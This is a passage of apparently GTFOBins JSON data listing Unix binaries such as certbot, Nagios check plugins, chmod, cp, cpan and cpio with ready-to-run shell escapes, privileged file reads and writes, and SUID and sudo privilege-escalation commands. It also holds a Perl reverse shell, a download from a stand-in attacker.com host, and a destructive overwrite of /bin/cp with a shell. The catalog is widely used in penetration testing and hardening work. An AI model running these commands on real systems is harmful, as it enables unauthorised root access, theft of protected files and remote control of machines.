                        "code": "LFILE=file_to_read\nsudo cat \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "certbot",
        "url": "https://gtfobins.github.io/gtfobins/certbot/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp -d)\ncertbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp -d)\nsudo certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir $TF --work-dir $TF --config-dir $TF --pre-hook '/bin/sh 1>&0 2>&0'"
                    }
                ]
            }
        ]
    },
    {
        "name": "cdist",
        "url": "https://gtfobins.github.io/gtfobins/cdist/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "cdist shell -s /bin/sh"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo cdist shell -s /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "check_by_ssh",
        "url": "https://gtfobins.github.io/gtfobins/check_by_ssh/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "This is the check_by_ssh Nagios plugin, available e.g. in /usr/lib/nagios/plugins/.\n\nWhen check_by_ssh version 2.4.5 (2023-05-31) or later from the Nagios Plugins project in it’s default configuration is used, it does not work anymore.\n\nt does still work on previous versions from the Nagios Plugins project or all versions from the Monitoring Project (e.g. used by Ubuntu/Debian)."
                    }
                ]
            },
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "The shell will only last 10 seconds.",
                        "code": "check_by_ssh -o \"ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)\" -H localhost -C xx"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "The shell will only last 10 seconds.",
                        "code": "sudo check_by_ssh -o \"ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)\" -H localhost -C xx"
                    }
                ]
            }
        ]
    },
    {
        "name": "check_cups",
        "url": "https://gtfobins.github.io/gtfobins/check_cups/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "This is the check_cups Nagios plugin, available e.g. in /usr/lib/nagios/plugins/. The read file content is limited to the first line."
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\ncheck_cups --extra-opts=@$LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo check_cups --extra-opts=@$LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "check_log",
        "url": "https://gtfobins.github.io/gtfobins/check_log/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "This is the check_log Nagios plugin, available e.g. in /usr/lib/nagios/plugins/."
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_write\nINPUT=input_file\ncheck_log -F $INPUT -O $LFILE"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nOUTPUT=output_file\ncheck_log -F $LFILE -O $OUTPUT\ncat $OUTPUT"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_write\nINPUT=input_file\nsudo check_log -F $INPUT -O $LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "check_memory",
        "url": "https://gtfobins.github.io/gtfobins/check_memory/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "This is the check_memory Nagios plugin, available e.g. in /usr/lib/nagios/plugins/. The read file content is limited to the first line."
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\ncheck_memory --extra-opts=@$LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo check_memory --extra-opts=@$LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "check_raid",
        "url": "https://gtfobins.github.io/gtfobins/check_raid/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "This is the check_raid Nagios plugin, available e.g. in /usr/lib/nagios/plugins/. The read file content is limited to the first line."
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\ncheck_raid --extra-opts=@$LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo check_raid --extra-opts=@$LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "check_ssl_cert",
        "url": "https://gtfobins.github.io/gtfobins/check_ssl_cert/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "This is the check_by_ssh Nagios plugin, available e.g. in /usr/lib/nagios/plugins/."
                    }
                ]
            },
            {
                "function": "Command",
                "description": "It can be used to break out from restricted environments by running non-interactive system commands.",
                "examples": [
                    {
                        "description": "The host example.net must return a certificate via TLS",
                        "code": "COMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho \"$COMMAND | tee $OUTPUT\" > $TF\nchmod +x $TF\ncheck_ssl_cert --curl-bin $TF -H example.net\ncat $OUTPUT"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "The host example.net must return a certificate via TLS",
                        "code": "COMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho \"$COMMAND | tee $OUTPUT\" > $TF\nchmod +x $TF\numask 022\ncheck_ssl_cert --curl-bin $TF -H example.net\ncat $OUTPUT"
                    }
                ]
            }
        ]
    },
    {
        "name": "chmod",
        "url": "https://gtfobins.github.io/gtfobins/chmod/",
        "functions": [
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which chmod) .\n\nLFILE=file_to_change\n./chmod 6777 $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_change\nsudo chmod 6777 $LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "check_statusfile",
        "url": "https://gtfobins.github.io/gtfobins/check_statusfile/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "This is the check_statusfile Nagios plugi plugin, available e.g. in /usr/lib/nagios/plugins/. The read file content is limited to the first line."
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\ncheck_statusfile $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo check_statusfile $LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "choom",
        "url": "https://gtfobins.github.io/gtfobins/choom/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "choom -n 0 /bin/sh"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which choom) .\n\n./choom -n 0 -- /bin/sh -p"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo choom -n 0 /bin/sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "chown",
        "url": "https://gtfobins.github.io/gtfobins/chown/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "This can be run with elevated privileges to change ownership and then read, write, or execute a file."
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which chown) .\n\nLFILE=file_to_change\n./chown $(id -un):$(id -gn) $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_change\nsudo chown $(id -un):$(id -gn) $LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "chroot",
        "url": "https://gtfobins.github.io/gtfobins/chroot/",
        "functions": [
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which chroot) .\n\n./chroot / /bin/sh -p"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo chroot /"
                    }
                ]
            }
        ]
    },
    {
        "name": "clamscan",
        "url": "https://gtfobins.github.io/gtfobins/clamscan/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "Each line of the file is interpreted as a path and the content is leaked via error messages, thus this might not be suitable to read binary files. The output can optionally be cleaned using sed."
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nTF=$(mktemp -d)\ntouch $TF/empty.yara\nclamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which clamscan) .\n\nLFILE=file_to_read\nTF=$(mktemp -d)\ntouch $TF/empty.yara\n./clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nTF=$(mktemp -d)\ntouch $TF/empty.yara\nsudo clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'"
                    }
                ]
            }
        ]
    },
    {
        "name": "cmp",
        "url": "https://gtfobins.github.io/gtfobins/cmp/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "Dump the bytes of the input file that are different from the NUL byte in a tabular format, hence this may not be suitable to read arbitrary binary files."
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\ncmp $LFILE /dev/zero -b -l"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which cmp) .\n\nLFILE=file_to_read\n./cmp $LFILE /dev/zero -b -l"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo cmp $LFILE /dev/zero -b -l"
                    }
                ]
            }
        ]
    },
    {
        "name": "comm",
        "url": "https://gtfobins.github.io/gtfobins/comm/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\ncomm $LFILE /dev/null 2>/dev/null"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which comm) .\n\nLFILE=file_to_read\ncomm $LFILE /dev/null 2>/dev/null"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo comm $LFILE /dev/null 2>/dev/null"
                    }
                ]
            }
        ]
    },
    {
        "name": "column",
        "url": "https://gtfobins.github.io/gtfobins/column/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "column expects textual data."
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\ncolumn $LFILE"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which column) .\n\nLFILE=file_to_read\n./column $LFILE"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo column $LFILE"
                    }
                ]
            }
        ]
    },
    {
        "name": "cobc",
        "url": "https://gtfobins.github.io/gtfobins/cobc/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp -d)\necho 'CALL \"SYSTEM\" USING \"/bin/sh\".' > $TF/x\ncobc -xFj --frelax-syntax-checks $TF/x"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp -d)\necho 'CALL \"SYSTEM\" USING \"/bin/sh\".' > $TF/x\nsudo cobc -xFj --frelax-syntax-checks $TF/x"
                    }
                ]
            }
        ]
    },
    {
        "name": "cowsay",
        "url": "https://gtfobins.github.io/gtfobins/cowsay/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "It allows to execute perl code, other functions may apply."
                    }
                ]
            },
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\ncowsay -f $TF x"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowsay -f $TF x"
                    }
                ]
            }
        ]
    },
    {
        "name": "cowthink",
        "url": "https://gtfobins.github.io/gtfobins/cowthink/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                      "description": "It allows to execute perl code, other functions may apply."
                    }
                ]
            },
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\ncowthink -f $TF x"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowthink -f $TF x"
                    }
                ]
            }
        ]
    },
    {
        "name": "composer",
        "url": "https://gtfobins.github.io/gtfobins/composer/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp -d)\necho '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >$TF/composer.json\ncomposer --working-dir=$TF run-script x"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp -d)\necho '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >$TF/composer.json\nsudo composer --working-dir=$TF run-script x"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which composer) .\n\nTF=$(mktemp -d)\necho '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >$TF/composer.json\n./composer --working-dir=$TF run-script x"
                    }
                ]
            }
        ]
    },
    {
        "name": "cp",
        "url": "https://gtfobins.github.io/gtfobins/cp/",
        "functions": [
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_write\necho \"DATA\" | cp /dev/stdin \"$LFILE\""
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\ncp \"$LFILE\" /dev/stdout"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which cp) .\n\nLFILE=file_to_write\necho \"DATA\" | ./cp /dev/stdin \"$LFILE\""
                    },
                    {
                        "description": "This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of cp has the --parents option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)",
                        "code": "sudo install -m =xs $(which cp) .\n\nLFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\n./cp $TF $LFILE"
                    },
                    {
                        "description": "This can copy SUID permissions from any SUID binary (e.g., cp itself) to another.",
                        "code": "sudo install -m =xs $(which cp) .\n\nLFILE=file_to_change\n./cp --attributes-only --preserve=all ./cp \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_write\necho \"DATA\" | sudo cp /dev/stdin \"$LFILE\""
                    },
                    {
                        "description": "This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of cp has the --parents option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)",
                        "code": "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nsudo cp $TF $LFILE"
                    },
                    {
                        "description": "This overrides cp itself with a shell (or any other executable) that is to be executed as root, useful in case a sudo rule allows to only run cp by path. Warning, this is a destructive action.",
                        "code": "sudo cp /bin/sh /bin/cp\nsudo cp"
                    }
                ]
            }
        ]
    },
    {
        "name": "cpan",
        "url": "https://gtfobins.github.io/gtfobins/cpan/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "cpan lets you execute perl commands with the ! command.",
                        "code": "cpan\n! exec '/bin/bash'"
                    }
                ]
            },
            {
                "function": "Reverse shell",
                "description": "It can send back a reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "description": "Run nc -lvp RPORT on the attacker box to receive the shell.",
                        "code": "export RHOST=localhost\nexport RPORT=9000\ncpan\n! use Socket; my $i=\"$ENV{RHOST}\"; my $p=$ENV{RPORT}; socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\"); open(STDOUT,\">&S\"); open(STDERR,\">&S\"); exec(\"/bin/sh -i\");};"
                    }
                ]
            },
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "Serve files in the local folder running an HTTP server on port 8080. Install the dependency via cpan HTTP::Server::Simple.",
                        "code": "cpan\n! use HTTP::Server::Simple; my $server= HTTP::Server::Simple->new(); $server->run();"
                    }
                ]
            },
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "Fetch a remote file via an HTTP GET request and store it in PWD.",
                        "code": "export URL=http://attacker.com/file_to_get\ncpan\n! use File::Fetch; my $file = (File::Fetch->new(uri => \"$ENV{URL}\"))->fetch();"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo cpan\n! exec '/bin/bash'"
                    }
                ]
            }
        ]
    },
    {
        "name": "cpio",
        "url": "https://gtfobins.github.io/gtfobins/cpio/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "echo '/bin/sh </dev/tty >/dev/tty' >localhost\ncpio -o --rsh-command /bin/sh -F localhost:"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "Copies $LFILE to the $LDIR directory.",
                        "code": "LFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | cpio -up $LDIR"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The content of the file is printed to standard output, between the cpio archive format header and footer.",
                        "code": "LFILE=file_to_read\necho \"$LFILE\" | cpio -o"
                    },
                    {
                        "description": "The whole directory structure is copied to $TF.",
                        "code": "LFILE=file_to_read\nTF=$(mktemp -d)\necho \"$LFILE\" | cpio -dp $TF\ncat \"$TF/$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "The whole directory structure is copied to $TF.",
                        "code": "sudo install -m =xs $(which cpio) .\n\nLFILE=file_to_read\nTF=$(mktemp -d)\necho \"$LFILE\" | ./cpio -R $UID -dp $TF\ncat \"$TF/$LFILE\""
                    },
                    {
                        "description": "Copies $LFILE to the $LDIR directory.",
                        "code": "sudo install -m =xs $(which cpio) .\n\nLFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | ./cpio -R 0:0 -p $LDIR"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "echo '/bin/sh </dev/tty >/dev/tty' >localhost\nsudo cpio -o --rsh-command /bin/sh -F localhost:"
                    },
                    {
                        "description": "The whole directory structure is copied to $TF.",
                        "code": "LFILE=file_to_read\nTF=$(mktemp -d)\necho \"$LFILE\" | sudo cpio -R $UID -dp $TF\ncat \"$TF/$LFILE\""
                    },
                    {
                        "description": "Copies $LFILE to the $LDIR directory.",
                        "code": "LFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | sudo cpio -R 0:0 -p $LDIR"
                    }
                ]
            }
        ]
    },
    {
        "name": "cpulimit",
        "url": "https://gtfobins.github.io/gtfobins/cpulimit/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "cpulimit -l 100 -f /bin/sh"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
